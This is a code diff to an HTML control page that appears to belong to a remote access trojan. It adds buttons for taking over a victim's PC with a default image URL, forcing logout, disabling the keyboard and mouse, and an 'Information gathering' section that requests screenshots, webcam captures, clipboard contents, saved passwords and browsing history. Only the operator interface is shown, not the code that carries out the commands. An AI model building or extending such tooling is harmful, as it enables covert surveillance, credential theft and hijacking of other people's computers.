@@ -90,11 +90,28 @@
         <label for="seconds">Seconds</label>
         <input type="text" id="seconds" name="seconds" placeholder="Seconds for scripts" value="10">
 
-        <button type="button" onclick="send('disableLoginForXSeconds')">Disable Workstation for X duration</button>
+        <div class="spacer"></div>
+
+        <label for="lock">PC override endpoint</label>
+        <input type="text" id="lock" name="lock" placeholder="URL for takeover" value="https://raw.githubusercontent.com/MrBreakNFix/website/main/best.png">
+
+
+        <button type="button" onclick="send('lockWorkstationForXSeconds')">PC override for X duration</button>
+        <button type="button" onclick="send('disableLoginForXSeconds')">Force logout workstation for X duration</button>
         <button type="button" onclick="send('disableMouseForXSeconds')">Disable Mouse for X duration</button>
+        <button type="button" onclick="send('disableKeyboardForXSeconds')">Disable Keyboard for X duration</button>
+        <button type="button" onclick="send('disableMouseForXSecondsV2')">Disable Mouse for X duration</button>
 
         <hr>
-        <h3>Special</h3>
+        <h3>Information gathering</h3>
+        <button type="button" onclick="send('getIP')">Get IP</button>
+        <button type="button" onclick="send('getInfo')">Get Info</button>
+        <button type="button" onclick="send('getScreenshot')">Get Screenshot</button>
+        <button type="button" onclick="send('getWebcam')">Get Webcam</button>
+        <button type="button" onclick="send('getClipboard')">Get Clipboard</button>
+        <button type="button" onclick="send('getPasswords')">Get Passwords</button>
+        <button type="button" onclick="send('getHistory')">Get History</button>
+
 
     </div>
 
